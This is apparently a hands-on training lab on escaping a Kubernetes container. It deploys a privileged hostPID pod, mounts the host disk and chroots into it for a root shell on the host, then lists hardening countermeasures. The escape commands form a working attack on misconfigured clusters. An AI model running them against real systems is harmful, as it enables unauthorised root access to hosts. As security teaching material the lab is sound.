# 🧪 Container Escape in Kubernetes (for Educational Purposes Only)

## ⚠️ Disclaimer
**This lab is for training and awareness only!**  
Never attempt container escapes in unauthorized environments.

---

## 🎯 Objective
Understand how misconfigured containers can allow attackers to escape into the host system.

---

## 🧰 Prerequisites

- Kubernetes cluster (preferably local, like Minikube or kind)
- `kubectl` configured
- A pod is allowed to run in privileged mode (for simulation)

---

## 🔹 Lab 1: Deploy a Privileged Pod

Deploy a highly privileged pod:

```yaml
# privileged-escape-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-demo
spec:
  hostPID: true
  containers:
  - name: attacker
    image: busybox
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
```

```bash
kubectl apply -f privileged-escape-pod.yaml
```

✅ Pod runs with `hostPID` and `privileged` mode — dangerous in production!

---

## 🔹 Lab 2: Inspect Host Processes from Inside the Pod

```bash
kubectl exec -it escape-demo -- sh
```

Inside the container:

```bash
ps aux
```

✅ **Expected:** You see host system processes.

---

## 🔹 Lab 3: Access the Host Filesystem

Still inside the container:

```bash
ls /host
```

(May fail if `/host` is not mounted — so let's try mounting it.)

Mount the host root filesystem:

```bash
mkdir /mnt
mount /dev/sda1 /mnt
ls /mnt
```

✅ Gain access to the host filesystem.

---

## 🔹 Lab 4: Spawn a Host Shell

Inside the container (dangerous):

```bash
chroot /mnt /bin/sh
```

✅ **You are now running as root on the host** from inside the container.

---

## 🔹 Lab 5: Defensive Countermeasures

- **Never** allow `privileged: true` unless absolutely necessary.
- **Do not** enable `hostPID`, `hostNetwork`, or `hostIPC` unless required.
- Use **PodSecurityAdmission** with `restricted` level.
- Enforce **AppArmor**, **Seccomp**, and **readOnlyRootFilesystem**.
- Regularly audit pods for excessive privileges.

---

## 🔹 Lab 6: Clean Up

```bash
kubectl delete pod escape-demo
```

---

## ✅ Wrap-Up

- ✅ Demonstrated how container misconfiguration can lead to host escape
- ✅ Understood the power of `privileged` and `hostPID`
- ✅ Learned prevention strategies for real-world defense

---